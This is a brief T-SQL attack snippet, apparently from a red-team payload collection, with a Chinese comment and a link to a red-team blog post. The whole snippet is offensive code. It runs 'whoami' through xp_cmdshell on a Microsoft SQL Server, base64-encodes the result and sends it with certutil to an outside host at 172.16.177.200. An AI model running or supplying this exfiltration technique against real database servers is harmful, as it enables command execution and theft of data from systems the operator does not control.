-- 将命令执行结果 base64 编码，放到URL里，然后使用 certutil 发送出去
-- https://www.tarlogic.com/en/blog/red-team-tales-0x01/

declare @r varchar(4120),@cmdOutput varchar(4120);
declare @res TABLE(line varchar(max));

insert into @res exec xp_cmdshell 'whoami';

set @cmdOutput=(select (select cast((select line+char(10) COLLATE SQL_Latin1_General_CP1253_CI_AI as 'text()' from @res for xml path('')) as varbinary(max))) for xml path(''),binary base64);

set @r='certutil -urlcache -f http://172.16.177.200/?data=' + @cmdOutput;

exec xp_cmdshell @r;
